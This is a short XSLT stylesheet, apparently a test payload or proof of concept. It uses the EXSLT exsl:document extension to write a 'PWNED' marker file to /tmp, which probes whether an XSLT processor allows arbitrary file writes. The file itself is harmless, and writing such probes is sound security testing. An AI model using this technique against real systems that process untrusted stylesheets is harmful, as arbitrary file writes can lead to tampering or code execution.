<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:output method="html"/>

  <xsl:template match="/">
    <!-- Try to write a file using exsl:document -->
    <exsl:document href="/tmp/pwned.txt" method="text">
      PWNED
    </exsl:document>
    <html><body>Wrote file</body></html>
  </xsl:template>
</xsl:stylesheet>
